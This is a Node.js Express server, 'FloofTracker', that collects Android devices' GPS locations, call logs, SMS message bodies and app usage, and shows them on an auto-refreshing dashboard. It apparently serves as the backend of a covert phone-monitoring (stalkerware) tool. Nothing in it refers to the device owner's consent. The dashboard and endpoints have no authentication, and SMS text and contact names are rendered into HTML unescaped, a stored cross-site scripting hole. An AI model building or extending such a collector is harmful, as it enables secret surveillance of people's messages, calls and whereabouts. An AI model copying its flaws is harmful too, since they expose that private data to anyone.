const express = require('express');
const app = express();
app.use(express.json());

const PORT = process.env.PORT || 3000;

// Store data in memory (we'll add a database later)
const data = {
  devices: {},
  gps: [],
  calls: [],
  sms: [],
  apps: []
};

// Middleware to get device token
function getToken(req) {
  return req.headers['x-device-token'] || 'unknown';
}

// Register device
app.post('/device/register', (req, res) => {
  const token = getToken(req);
  data.devices[token] = { ...req.body, last_seen: new Date() };
  console.log(`Device registered: ${token}`, req.body);
  res.json({ success: true });
});

// GPS location
app.post('/device/gps', (req, res) => {
  const token = getToken(req);
  data.gps.push({ token, ...req.body, received_at: new Date() });
  console.log(`GPS from ${token}:`, req.body);
  res.json({ success: true });
});

// Call logs
app.post('/device/calls', (req, res) => {
  const token = getToken(req);
  const calls = req.body.map(c => ({ token, ...c }));
  data.calls.push(...calls);
  console.log(`${calls.length} calls from ${token}`);
  res.json({ success: true });
});

// SMS
app.post('/device/sms', (req, res) => {
  const token = getToken(req);
  const messages = req.body.map(m => ({ token, ...m }));
  data.sms.push(...messages);
  console.log(`${messages.length} SMS from ${token}`);
  res.json({ success: true });
});

// App usage
app.post('/device/apps', (req, res) => {
    const token = getToken(req);
    const apps = req.body.map(a => ({ token, ...a }));
    // Replace all apps for this token instead of appending
    data.apps = data.apps.filter(a => a.token !== token);
    data.apps.push(...apps);
    console.log(`${apps.length} apps from ${token}`);
    res.json({ success: true });
});

// Dashboard - view all data
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>FloofTracker Dashboard</title>
        <meta http-equiv="refresh" content="30">
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }
            h1 { color: #333; }
            .device { background: white; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
            table { width: 100%; border-collapse: collapse; background: white; border-radius: 8px; margin-bottom: 20px; }
            th { background: #333; color: white; padding: 10px; text-align: left; }
            td { padding: 8px 10px; border-bottom: 1px solid #eee; }
            tr:hover { background: #f9f9f9; }
            h2 { color: #555; margin-top: 20px; }
        </style>
    </head>
    <body>
        <h1>FloofTracker Dashboard</h1>

        <h2>Devices</h2>
        ${Object.entries(data.devices).map(([token, d]) => `
            <div class="device">
                <b>Token:</b> ${token}<br>
                <b>Model:</b> ${d.device_model}<br>
                <b>Android:</b> ${d.android_version}<br>
                <b>Last seen:</b> ${d.last_seen}
            </div>
        `).join('')}

        <h2>App Usage</h2>
        <table>
            <tr><th>Device</th><th>App</th><th>Usage</th><th>Date</th></tr>
            ${data.apps.map(a => `
                <tr>
                    <td>${a.token}</td>
                    <td>${a.app_name}</td>
                    <td>${Math.round(a.usage_seconds / 60)} min</td>
                    <td>${a.usage_date}</td>
                </tr>
            `).join('')}
        </table>

        <h2>Calls</h2>
        <table>
            <tr><th>Device</th><th>Number</th><th>Name</th><th>Type</th><th>Duration</th><th>Date</th></tr>
            ${data.calls.map(c => `
                <tr>
                    <td>${c.token}</td>
                    <td>${c.number}</td>
                    <td>${c.contact_name}</td>
                    <td>${c.call_type}</td>
                    <td>${c.duration_seconds}s</td>
                    <td>${new Date(c.called_at).toLocaleString()}</td>
                </tr>
            `).join('')}
        </table>

        <h2>SMS</h2>
        <table>
            <tr><th>Device</th><th>Number</th><th>Type</th><th>Message</th><th>Date</th></tr>
            ${data.sms.map(s => `
                <tr>
                    <td>${s.token}</td>
                    <td>${s.number}</td>
                    <td>${s.sms_type}</td>
                    <td>${s.message_body}</td>
                    <td>${new Date(s.received_at).toLocaleString()}</td>
                </tr>
            `).join('')}
        </table>

        <h2>GPS</h2>
        <table>
            <tr><th>Device</th><th>Latitude</th><th>Longitude</th><th>Accuracy</th><th>Date</th></tr>
            ${data.gps.map(g => `
                <tr>
                    <td>${g.token}</td>
                    <td>${g.latitude}</td>
                    <td>${g.longitude}</td>
                    <td>${g.accuracy}m</td>
                    <td>${new Date(g.received_at).toLocaleString()}</td>
                </tr>
            `).join('')}
        </table>
    </body>
    </html>
    `);
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});